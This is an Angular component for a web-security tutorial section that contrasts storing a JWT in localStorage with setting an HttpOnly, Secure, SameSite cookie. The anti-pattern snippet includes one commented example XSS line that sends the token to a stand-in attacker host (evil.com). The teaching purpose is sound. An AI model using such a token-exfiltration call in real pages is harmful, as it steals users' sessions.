import { Component } from '@angular/core';
import { TranslatePipe } from '@ngx-translate/core';

@Component({
  selector: 'app-section-http-only-cookie',
  standalone: true,
  imports: [TranslatePipe],
  templateUrl: './http-only-cookie.component.html',
  styleUrl: './http-only-cookie.component.scss',
})
export class HttpOnlyCookieComponent {
  readonly codeAnti = `<span class="cm">// Storing JWT in localStorage — readable by any JS on the page</span>
<span class="kw">const</span> jwt = <span class="kw">await</span> <span class="fn">login</span>(credentials);
localStorage.<span class="fn">setItem</span>(<span class="str">'token'</span>, jwt);

<span class="cm">// Any XSS payload can read it:</span>
<span class="cm">// fetch('https://evil.com?t=' + localStorage.token)</span>`;

  readonly codeBest = `<span class="cm">// Server sets HttpOnly cookie — JS cannot read it at all</span>
Set-Cookie: <span class="attr">token</span>=<span class="str">&lt;jwt&gt;</span>;
  <span class="attr">HttpOnly</span>;
  <span class="attr">Secure</span>;
  <span class="attr">SameSite</span>=<span class="str">Strict</span>;
  <span class="attr">Path</span>=<span class="str">/</span>

<span class="cm">// Browser attaches cookie automatically; XSS cannot steal it</span>`;
}
